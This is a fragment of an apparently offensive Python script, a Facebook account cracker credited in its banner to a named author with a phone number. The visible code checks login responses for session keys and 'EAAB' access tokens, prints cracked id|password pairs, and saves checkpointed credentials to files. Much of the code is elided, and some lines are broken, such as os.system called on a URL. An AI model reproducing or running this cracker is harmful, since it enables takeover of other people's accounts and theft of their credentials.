...
██   ██ ██████  ██   ████ ██   ██ ██   ████     
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Authur   Adnan Sheikh    \x1b[92;1m=>         \x1b[93;1m MR-GREEN
\x1b[93;1m Whatsp 01581469773      \x1b[92;1m=>        \x1b[93;1m018801+++++
\x1b[93;1m Github  adnansheikh404     \x1b[92;1m=>         \x1b[93;1m GREEN
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
		
def menu(): #ADNAN SHEIKH 
	banner()
	print("") #ADNAN SHEIKH 
	...
	if farhan in ['1','01']:
		...
		os.system("https://www.facebook.com/adnan.tera.real.papa")
		exit()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [ADNAN-CP] %s|%s        '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s [ADNAN-ok] %s|%s        '%(h,idf,pw))
